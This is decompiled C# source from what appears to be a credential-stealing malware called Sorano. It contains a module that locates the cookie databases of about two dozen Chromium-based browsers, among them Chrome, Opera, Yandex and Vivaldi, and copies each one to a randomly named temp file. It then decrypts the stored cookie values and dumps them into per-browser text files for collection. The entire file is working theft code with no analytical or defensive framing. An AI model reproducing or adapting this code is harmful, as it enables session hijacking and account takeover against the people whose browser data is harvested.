using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Sorano.Stealer;

namespace Sorano.Cookies
{
	// Token: 0x02000007 RID: 7
	internal static class Chromium
	{
		// Token: 0x06000009 RID: 9 RVA: 0x000030C4 File Offset: 0x000012C4
		public static void ChromiumInitialise(string path)
		{
			string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
			string[] array = new string[]
			{
				environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Cookies",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Cookies",
				environmentVariable + "\\Kometa\\User Data\\Default\\Cookies",
				environmentVariable + "\\Orbitum\\User Data\\Default\\Cookies",
				environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Cookies",
				environmentVariable + "\\Amigo\\User\\User Data\\Default\\Cookies",
				environmentVariable + "\\Torch\\User Data\\Default\\Cookies",
				environmentVariable + "\\CentBrowser\\User Data\\Default\\Сookies",
				environmentVariable + "\\Go!\\User Data\\Default\\Cookies",
				environmentVariable + "\\uCozMedia\\Uran\\User Data\\Default\\Cookies",
				environmentVariable + "\\MapleStudio\\ChromePlus\\User Data\\Default\\Cookies",
				environmentVariable + "\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies",
				environmentVariable + "\\BlackHawk\\User Data\\Default\\Cookies",
				environmentVariable + "\\AcWebBrowser\\User Data\\Default\\Cookies",
				environmentVariable + "\\CoolNovo\\User Data\\Default\\Cookies",
				environmentVariable + "\\Epic Browser\\User Data\\Default\\Cookies",
				environmentVariable + "\\Baidu Spark\\User Data\\Default\\Cookies",
				environmentVariable + "\\Rockmelt\\User Data\\Default\\Cookies",
				environmentVariable + "\\Sleipnir\\User Data\\Default\\Cookies",
				environmentVariable + "\\SRWare Iron\\User Data\\Default\\Cookies",
				environmentVariable + "\\Titan Browser\\User Data\\Default\\Cookies",
				environmentVariable + "\\Flock\\User Data\\Default\\Cookies",
				environmentVariable + "\\Vivaldi\\User Data\\Default\\Cookies",
				environmentVariable + "\\Sputnik\\User Data\\Default\\Cookies",
				environmentVariable + "\\Maxthon\\User Data\\Default\\Cookies"
			};
			foreach (string text in array)
			{
				try
				{
					string str = "";
					bool flag = text.Contains("Chrome");
					if (flag)
					{
						str = "Google";
					}
					bool flag2 = text.Contains("Yandex");
					if (flag2)
					{
						str = "Yandex";
					}
					bool flag3 = text.Contains("Orbitum");
					if (flag3)
					{
						str = "Orbitum";
					}
					bool flag4 = text.Contains("Opera");
					if (flag4)
					{
						str = "Opera";
					}
					bool flag5 = text.Contains("Amigo");
					if (flag5)
					{
						str = "Amigo";
					}
					bool flag6 = text.Contains("Torch");
					if (flag6)
					{
						str = "Torch";
					}
					bool flag7 = text.Contains("Comodo");
					if (flag7)
					{
						str = "Comodo";
					}
					bool flag8 = text.Contains("CentBrowser");
					if (flag8)
					{
						str = "CentBrowser";
					}
					bool flag9 = text.Contains("Go!");
					if (flag9)
					{
						str = "Go!";
					}
					bool flag10 = text.Contains("uCozMedia");
					if (flag10)
					{
						str = "uCozMedia";
					}
					bool flag11 = text.Contains("MapleStudio");
					if (flag11)
					{
						str = "MapleStudio";
					}
					bool flag12 = text.Contains("BlackHawk");
					if (flag12)
					{
						str = "BlackHawk";
					}
					bool flag13 = text.Contains("CoolNovo");
					if (flag13)
					{
						str = "CoolNovo";
					}
					bool flag14 = text.Contains("Vivaldi");
					if (flag14)
					{
						str = "Vivaldi";
					}
					bool flag15 = text.Contains("Sputnik");
					if (flag15)
					{
						str = "Sputnik";
					}
					bool flag16 = text.Contains("Maxthon");
					if (flag16)
					{
						str = "Maxthon";
					}
					bool flag17 = text.Contains("AcWebBrowser");
					if (flag17)
					{
						str = "AcWebBrowser";
					}
					bool flag18 = text.Contains("Epic Browser");
					if (flag18)
					{
						str = "Epic Browser";
					}
					bool flag19 = text.Contains("Baidu Spark");
					if (flag19)
					{
						str = "Baidu Spark";
					}
					bool flag20 = text.Contains("Rockmelt");
					if (flag20)
					{
						str = "Rockmelt";
					}
					bool flag21 = text.Contains("Sleipnir");
					if (flag21)
					{
						str = "Sleipnir";
					}
					bool flag22 = text.Contains("SRWare Iron");
					if (flag22)
					{
						str = "SRWare Iron";
					}
					bool flag23 = text.Contains("Titan Browser");
					if (flag23)
					{
						str = "Titan Browser";
					}
					bool flag24 = text.Contains("Flock");
					if (flag24)
					{
						str = "Flock";
					}
					try
					{
						List<Cookie> cookies = Chromium.GetCookies(text);
						bool flag25 = cookies != null;
						if (flag25)
						{
							Directory.CreateDirectory(path + "\\Cookies\\");
							using (StreamWriter streamWriter = new StreamWriter(path + "\\Cookies\\" + str + "_cookies.txt"))
							{
								foreach (Cookie cookie in cookies)
								{
									bool flag26 = cookie.expirationDate == "9223372036854775807";
									if (flag26)
									{
										cookie.expirationDate = "0";
									}
									bool flag27 = cookie.domain[0] != '.';
									if (flag27)
									{
										cookie.hostOnly = "FALSE";
									}
									streamWriter.Write(string.Concat(new string[]
									{
										cookie.domain,
										"\t",
										cookie.hostOnly,
										"\t",
										cookie.path,
										"\t",
										cookie.secure,
										"\t",
										cookie.expirationDate,
										"\t",
										cookie.name,
										"\t",
										cookie.value,
										"\r\n"
									}));
								}
							}
						}
					}
					catch
					{
					}
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.ToString());
				}
			}
		}

		// Token: 0x0600000A RID: 10 RVA: 0x000036C8 File Offset: 0x000018C8
		private static List<Cookie> GetCookies(string basePath)
		{
			bool flag = !File.Exists(basePath);
			List<Cookie> result;
			if (flag)
			{
				result = null;
			}
			else
			{
				try
				{
					string text = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv";
					bool flag2 = File.Exists(text);
					if (flag2)
					{
						File.Delete(text);
					}
					File.Copy(basePath, text, true);
					Sqlite sqlite = new Sqlite(text);
					sqlite.ReadTable("cookies");
					List<Cookie> list = new List<Cookie>();
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						try
						{
							string value = string.Empty;
							try
							{
								value = Encoding.UTF8.GetString(Chromium.DecryptChromium(Encoding.Default.GetBytes(sqlite.GetValue(i, 12)), null));
							}
							catch (Exception ex)
							{
							}
							bool flag3;
							bool.TryParse(sqlite.GetValue(i, 6), out flag3);
							list.Add(new Cookie
							{
								domain = sqlite.GetValue(i, 1),
								name = sqlite.GetValue(i, 2),
								path = sqlite.GetValue(i, 4),
								expirationDate = sqlite.GetValue(i, 5),
								secure = flag3.ToString().ToUpper(),
								value = value,
								hostOnly = "TRUE"
							});
						}
						catch (Exception ex2)
						{
							Console.WriteLine(ex2.ToString());
						}
					}
					result = list;
				}
				catch
				{
					result = new List<Cookie>();
				}
			}
			return result;
		}
	}
}
